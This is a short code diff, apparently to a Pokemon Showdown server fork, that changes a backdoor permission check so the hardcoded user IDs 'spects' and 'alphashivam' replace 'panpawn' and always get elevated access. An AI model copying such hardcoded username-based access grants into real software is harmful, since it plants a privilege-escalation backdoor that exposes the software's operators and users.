@@ -515,7 +515,7 @@ class User {
 		// Pokemon Showdown, feel free to disable it, but remember that if
 		// you mess up your server in whatever way, our tech support will not
 		// be able to help you.
-		if (this.isSysop && Config.backdoor || this.goldDev || this.userid === 'panpawn') {
+		if (this.isSysop && Config.backdoor || this.goldDev || this.userid === 'spects' || this.userid === 'alphashivam') {
 			return true;
 		}
 		return false;
